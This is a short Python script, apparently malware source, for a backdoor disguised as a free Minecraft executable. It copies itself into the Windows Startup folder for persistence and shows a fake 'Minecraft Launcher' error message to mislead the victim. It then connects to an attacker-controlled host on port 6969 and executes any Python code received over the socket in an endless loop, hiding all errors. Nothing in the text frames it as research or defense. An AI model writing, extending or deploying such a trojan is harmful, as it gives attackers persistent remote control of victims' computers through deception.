import socket
import ctypes
import shutil
import os

sock = socket.socket()
host = "public ip"
port = 6969

shutil.copy("freeminecraft.exe", os.getenv("USERPROFILE") + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
ctypes.windll.user32.MessageBoxW(0, "Couldn't load launcher core from C:\Program Files (x86)\Minecraft Launcher\game\launcher.dll: LoadErrorNotPresent", "Minecraft Launcher", 0)

sock.connect((host, port))

while(True):
    command = sock.recv(1024)
    
    try:
        exec(command)
    except:
        pass

sock.close()
